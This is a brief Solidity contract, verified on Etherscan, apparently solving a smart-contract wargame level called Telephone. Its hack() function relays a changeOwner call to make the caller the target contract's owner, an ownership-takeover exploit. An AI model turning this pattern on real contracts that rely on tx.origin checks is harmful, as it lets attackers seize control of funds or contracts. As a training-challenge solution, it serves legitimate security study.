/**
 *Submitted for verification at Etherscan.io on 2022-08-01
*/

pragma solidity ^0.6.0;
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackedTelephone {

  address telePhoneAddress;
  constructor(address contractAddress) public {
    telePhoneAddress = contractAddress;
  }
  function hack() external {
    ITelephone(telePhoneAddress).changeOwner(msg.sender);
  }
}